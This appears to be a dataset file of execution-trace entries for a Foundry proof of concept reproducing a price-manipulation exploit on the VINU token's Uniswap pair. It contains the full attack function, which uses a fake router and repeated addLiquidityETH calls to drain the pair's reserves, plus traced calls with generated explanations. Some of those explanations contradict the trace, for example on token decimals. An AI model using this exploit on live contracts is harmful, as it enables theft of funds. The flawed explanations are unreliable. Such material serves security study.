@@ -1,0 +1,373 @@
+[
+    {
+        "id": "624823",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"Attacker's contract ETH balance before attack\", address(this).balance, 18);\n\n        emit log_named_decimal_uint(\n            \"Attacker's contract WETH balance before attack\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n\n        address[] memory path = new address[](2);\n        path[0] = address(WETH);\n        path[1] = address(VINU);\n        UniswapV2Router02.swapExactETHForTokens{value: 0.1 ether}(0, path, address(this), block.timestamp + 100);\n\n        // Deploying fake Router contract\n        FakeRouter = new Router();\n\n        // Manipulating the price of VINU\n        for (uint256 i; i < 4; ++i) {\n            VINU.addLiquidityETH(address(FakeRouter), address(this), address(Pair));\n        }\n        Pair.sync();\n        uint256 amountIn = VINU.balanceOf(address(this));\n        VINU.transfer(address(Pair), VINU.balanceOf(address(this)));\n\n        (uint112 reserveWETH, uint112 reserveVINU,) = Pair.getReserves();\n        flashbotsAddress.call{value: 0.000000001 ether}(\"\");\n        uint256 amountOut = UniswapV2Router02.getAmountOut(amountIn, reserveVINU, reserveWETH);\n\n        Pair.swap(amountOut, 0, address(this), \"\");\n\n        emit log_named_decimal_uint(\"Attacker's contract ETH balance after attack\", address(this).balance, 18);\n\n        emit log_named_decimal_uint(\n            \"Attacker's contract WETH balance after attack\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n    }\n",
+        "description": "1. **Core functions:**  \n   The `testExploit` function is designed to simulate an attack on a decentralized exchange (DEX) system. It first checks the attacker's contract balances for ETH and WETH (Wrapped ETH) before the attack. Then, it swaps ETH for a specific token (VINU) using a DEX router. After that, it deploys a fake router contract and manipulates the price of VINU by adding liquidity multiple times. Finally, it performs a swap to exploit the manipulated price and checks the attacker's contract balances again after the attack.\n\n2. **Security mechanism:**  \n   - The function does not include explicit security modifiers like `onlyOwner` or `nonReentrant`, which could prevent unauthorized access or reentrancy attacks.  \n   - It uses `block.timestamp + 100` to set a deadline for the swap transaction, ensuring it doesn\u2019t execute after a certain time.  \n   - The function emits logs to track the attacker's balances before and after the attack, which can be useful for monitoring but does not prevent the attack itself.  \n\n3. **Parameter Function:**  \n   - `value: 0.1 ether`: Specifies the amount of ETH to be swapped for tokens.  \n   - `path`: An array of token addresses defining the swap path (WETH to VINU).  \n   - `address(this)`: The recipient address for the swapped tokens.  \n   - `block.timestamp + 100`: Sets a deadline for the swap transaction.  \n   - `amountIn`: The amount of VINU tokens to be transferred to the pair contract.  \n   - `amountOut`: The calculated amount of tokens to be received after the swap.  \n\n4. **Return description:**  \n   The function does not return any value directly. Instead, it emits logs showing the attacker's ETH and WETH balances before and after the attack. The balances are calculated by querying the contract's ETH balance and the WETH token balance. The `amountOut` is calculated using the DEX router's `getAmountOut` function, which determines the output amount based on the input amount and the reserves of the token pair.  \n\nIn summary, the `testExploit` function simulates an attack on a DEX by manipulating token prices and swapping tokens to exploit the system. It lacks robust security mechanisms and relies on logs to track the attacker's balances. The function parameters define the swap details and deadlines, while the output is reflected in the emitted logs rather than a direct return value.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2534",
+        "args": "VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": "    function balanceOf(\n        address account\n    ) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n",
+        "description": "1. **Core functions**:  \n   This function is designed to check and return the balance of a specific account. It looks up the balance associated with the given account address and provides that value as the result. It\u2019s a simple and essential function for tracking how many tokens or assets an account holds.\n\n2. **Security mechanism**:  \n   The function uses the `view` modifier, which ensures that it does not modify the state of the contract (i.e., it only reads data). The `override` keyword indicates that this function is overriding a function from a parent contract, ensuring compatibility with inherited logic. These mechanisms help maintain security by preventing unintended changes to the contract\u2019s state.\n\n3. **Parameter Function**:  \n   The function takes one parameter, `account`, which is an address. This parameter specifies the account whose balance you want to check. It acts as the key to look up the balance in the contract\u2019s storage.\n\n4. **Return description**:  \n   The function returns a `uint256` value, which represents the balance of the specified account. It retrieves this value directly from the `_balances` mapping, which stores the balances of all accounts in the contract.\n\nIn summary, this function is a straightforward tool for checking the balance of a specific account. It uses security measures to ensure it only reads data and does not alter the contract\u2019s state. The `account` parameter identifies the account to query, and the function returns the corresponding balance from the contract\u2019s storage.",
+        "return_value": "0"
+    },
+    {
+        "id": "2444",
+        "args": "",
+        "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 9;\n    }\n\n",
+        "description": "1. Core functions:  \nThe `decimals` function is a simple function that returns the number of decimal places used by a token. This is important for understanding how the token's value is represented, as it determines the smallest unit of the token that can be handled.\n\n2. Security mechanism:  \nThe function is marked as `public`, meaning it can be called by anyone, and `view`, which ensures it does not modify the state of the contract. The `virtual` keyword allows this function to be overridden by derived contracts, and `override` indicates that it is overriding a function from a parent contract. These modifiers ensure the function is safe to call and can be customized if needed.\n\n3. Parameter Function:  \nThis function does not take any parameters. It is designed to provide a fixed value (the number of decimal places) without requiring any input.\n\n4. Return description:  \nThe function always returns the value `9`, which means the token uses 9 decimal places. This is a fixed value and does not involve any calculations or dynamic logic.\n\nIn summary, the `decimals` function is a straightforward utility that returns the number of decimal places (9) for a token, ensuring clarity in how the token's value is represented. It is safe to call and can be customized in derived contracts if necessary.",
+        "return_value": "18"
+    },
+    {
+        "id": "151778",
+        "args": "0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1686049683 [1.686e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[100000000000000000 [1e17], 13983585451343353 [1.398e16]]"
+    },
+    {
+        "id": "2504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "3331124883166006871 [3.331e18], 481195916974392513 [4.811e17], 1686049235 [1.686e9]"
+    },
+    {
+        "id": "23974",
+        "args": "",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "8062",
+        "args": "0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8, 100000000000000000 [1e17]",
+        "original_code": "    function transfer(\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n",
+        "description": "1. **Core functions:**  \n   The `transfer` function is designed to send a specific amount of tokens from the caller's account to another account specified by the `recipient` address. It ensures that the tokens are moved securely and efficiently between the two accounts.\n\n2. **Security mechanism:**  \n   The function uses the `external` modifier, which means it can only be called from outside the contract, ensuring that internal contract logic cannot misuse it. Additionally, the function implicitly checks that the caller has enough tokens to transfer the specified `amount`, preventing overdrafts or insufficient balance issues.\n\n3. **Parameter Function:**  \n   - `recipient`: This is the address of the account that will receive the tokens. It specifies where the tokens should be sent.  \n   - `amount`: This is the number of tokens to be transferred from the caller's account to the recipient's account. It must be a non-negative value.\n\n4. **Return description:**  \n   The function returns a boolean value (`true` or `false`) to indicate whether the transfer was successful. If the transfer is completed without issues, it returns `true`. If there is a problem (e.g., insufficient balance), it returns `false`.\n\n**In summary,**  \nThe `transfer` function securely moves tokens from one account to another, ensuring the caller has enough balance and confirming the success of the operation with a boolean return value.",
+        "return_value": "true"
+    },
+    {
+        "id": "100543",
+        "args": "0, 13983585451343353 [1.398e16], VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "65588",
+        "args": "VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13983585451343353 [1.398e16]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "27477",
+        "args": "0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8, VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13983585451343353 [1.398e16]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000031adff33837df90000000000000000000000000000000000000000000000000031adff33837df9"
+    },
+    {
+        "id": "534",
+        "args": "0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8",
+        "original_code": null,
+        "description": null,
+        "return_value": "3431124883166006871 [3.431e18]"
+    },
+    {
+        "id": "598",
+        "args": "0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8",
+        "original_code": null,
+        "description": null,
+        "return_value": "467212331523049160 [4.672e17]"
+    },
+    {
+        "id": "198843",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "993 bytes of code"
+    },
+    {
+        "id": "58509",
+        "args": "Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8",
+        "original_code": "    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external virtual override payable ensure(deadline) returns (uint amountToken, uint amountETH, uint liquidity) {\n        (amountToken, amountETH) = _addLiquidity(\n            token,\n            WETH,\n            amountTokenDesired,\n            msg.value,\n            amountTokenMin,\n            amountETHMin\n        );\n        address pair = UniswapV2Library.pairFor(factory, token, WETH);\n        TransferHelper.safeTransferFrom(token, msg.sender, pair, amountToken);\n        IWETH(WETH).deposit{value: amountETH}();\n        assert(IWETH(WETH).transfer(pair, amountETH));\n        liquidity = IUniswapV2Pair(pair).mint(to);\n        // refund dust eth, if any\n        if (msg.value > amountETH) TransferHelper.safeTransferETH(msg.sender, msg.value - amountETH);\n    }\n\n    // **** REMOVE LIQUIDITY ****\n",
+        "description": "1. **Core functions:**  \n   The `addLiquidityETH` function is designed to add liquidity to a decentralized exchange (DEX) pool by combining a specific token with Ethereum (ETH). It allows users to contribute both the token and ETH to create a trading pair, ensuring that the pool has enough assets for others to trade. The function also handles the creation of liquidity tokens, which represent the user's share in the pool. Additionally, it refunds any excess ETH sent by the user.\n\n2. **Security mechanism:**  \n   - **`payable`:** This modifier allows the function to accept ETH sent along with the transaction.  \n   - **`ensure(deadline)`:** This ensures the transaction is executed before a specified deadline, preventing outdated or delayed transactions.  \n   - **`TransferHelper.safeTransferFrom` and `TransferHelper.safeTransferETH`:** These are utility functions that safely transfer tokens and ETH, reducing the risk of errors or vulnerabilities.  \n   - **`assert`:** This ensures that the transfer of WETH (wrapped ETH) to the pool is successful, reverting the transaction if it fails.  \n\n3. **Parameter Function:**  \n   - **`token`:** The address of the token to be added to the liquidity pool.  \n   - **`amountTokenDesired`:** The maximum amount of the token the user is willing to contribute.  \n   - **`amountTokenMin`:** The minimum amount of the token the user expects to contribute, ensuring they don\u2019t get less than expected.  \n   - **`amountETHMin`:** The minimum amount of ETH the user expects to contribute, ensuring they don\u2019t get less than expected.  \n   - **`to`:** The address that will receive the liquidity tokens representing the user\u2019s share in the pool.  \n   - **`deadline`:** The latest time by which the transaction must be completed, ensuring it doesn\u2019t execute too late.  \n\n4. **Return description:**  \n   The function returns three values:  \n   - **`amountToken`:** The actual amount of the token added to the pool, which may be less than `amountTokenDesired` depending on pool conditions.  \n   - **`amountETH`:** The actual amount of ETH added to the pool, which may be less than the ETH sent by the user.  \n   - **`liquidity`:** The amount of liquidity tokens minted and sent to the user, representing their share in the pool.  \n\nIn summary, the `addLiquidityETH` function allows users to add liquidity to a DEX pool by combining a token with ETH. It ensures the transaction is executed safely, within a specified deadline, and refunds any excess ETH. The function returns the actual amounts of token and ETH added, as well as the liquidity tokens representing the user\u2019s share in the pool.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "401",
+        "args": "",
+        "original_code": "",
+        "description": "",
+        "return_value": "Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]"
+    },
+    {
+        "id": "380",
+        "args": "",
+        "original_code": "",
+        "description": "",
+        "return_value": "WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]"
+    },
+    {
+        "id": "950",
+        "args": "VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]",
+        "original_code": "",
+        "description": "",
+        "return_value": "Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]"
+    },
+    {
+        "id": "1823",
+        "args": "VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], 373769865218439328 [3.737e17], 0, 0, VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1686049583 [1.686e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0, 0, 0"
+    },
+    {
+        "id": "795",
+        "args": "Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": "    function approve(\n        address spender,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
+        "description": "1. **Core functions:**  \n   The `approve` function allows the person calling it (the owner of tokens) to give permission to another address (the `spender`) to spend a specific amount of tokens on their behalf. This is a common function in token contracts to enable delegated spending.\n\n2. **Security mechanism:**  \n   - The function uses `public virtual override`, meaning it can be called by anyone (`public`), can be customized in derived contracts (`virtual`), and overrides a function from a parent contract (`override`).  \n   - It internally calls `_approve`, which likely includes checks to ensure the operation is valid and secure.  \n   - The `_msgSender()` function ensures the caller's address is correctly identified, which is important for security in contracts that support meta-transactions.\n\n3. **Parameter Function:**  \n   - `spender`: The address of the person or contract that is being given permission to spend tokens.  \n   - `amount`: The maximum number of tokens the `spender` is allowed to use.  \n\n4. **Return description:**  \n   The function always returns `true` to indicate that the approval operation was successful. This is a standard practice in ERC-20 token contracts to confirm the action was completed.  \n\n**In summary,**  \nThe `approve` function lets a token owner grant another address the right to spend a certain amount of their tokens. It includes security measures like identifying the caller and ensuring the operation is valid. The function takes the `spender` address and the `amount` of tokens as inputs and returns `true` to confirm the approval.",
+        "return_value": "true"
+    },
+    {
+        "id": "12509",
+        "args": "Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "401",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]"
+    },
+    {
+        "id": "380",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]"
+    },
+    {
+        "id": "950",
+        "args": "VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]"
+    },
+    {
+        "id": "1823",
+        "args": "VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], 74753973043687865 [7.475e16], 0, 0, VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1686049583 [1.686e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0, 0, 0"
+    },
+    {
+        "id": "795",
+        "args": "Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12509",
+        "args": "Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "401",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]"
+    },
+    {
+        "id": "380",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]"
+    },
+    {
+        "id": "950",
+        "args": "VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]"
+    },
+    {
+        "id": "1823",
+        "args": "VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], 14950794608737573 [1.495e16], 0, 0, VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1686049583 [1.686e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0, 0, 0"
+    },
+    {
+        "id": "795",
+        "args": "Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12509",
+        "args": "Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "401",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]"
+    },
+    {
+        "id": "380",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]"
+    },
+    {
+        "id": "950",
+        "args": "VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]"
+    },
+    {
+        "id": "1823",
+        "args": "VINU: [0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2], 2990158921747515 [2.99e15], 0, 0, VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1686049583 [1.686e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0, 0, 0"
+    },
+    {
+        "id": "795",
+        "args": "Router: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "7650",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "534",
+        "args": "0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8",
+        "original_code": null,
+        "description": null,
+        "return_value": "3431124883166006871 [3.431e18]"
+    },
+    {
+        "id": "598",
+        "args": "0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8",
+        "original_code": null,
+        "description": null,
+        "return_value": "747539730436879 [7.475e14]"
+    },
+    {
+        "id": "598",
+        "args": "VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "13983585451343353 [1.398e16]"
+    },
+    {
+        "id": "598",
+        "args": "VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "13983585451343353 [1.398e16]"
+    },
+    {
+        "id": "11024",
+        "args": "0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8, 13983585451343353 [1.398e16]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6113",
+        "args": "VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8, 13983585451343353 [1.398e16]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000031adff33837df90000000000000000000000000000000000000000000000000031adff33837df9"
+    },
+    {
+        "id": "504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "3431124883166006871 [3.431e18], 747539730436879 [7.475e14], 1686049583 [1.686e9]"
+    },
+    {
+        "id": "0",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1021",
+        "args": "13983585451343353 [1.398e16], 747539730436879 [7.475e14], 3431124883166006871 [3.431e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3256513152378912968 [3.256e18]"
+    },
+    {
+        "id": "36401",
+        "args": "3256513152378912968 [3.256e18], 0, VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "23162",
+        "args": "VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3256513152378912968 [3.256e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8",
+        "original_code": null,
+        "description": null,
+        "return_value": "174611730787093903 [1.746e17]"
+    },
+    {
+        "id": "598",
+        "args": "0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8",
+        "original_code": null,
+        "description": null,
+        "return_value": "14731125181780232 [1.473e16]"
+    },
+    {
+        "id": "534",
+        "args": "VinuTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3256513152378912968 [3.256e18]"
+    },
+    {
+        "id": "444",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    }
+]
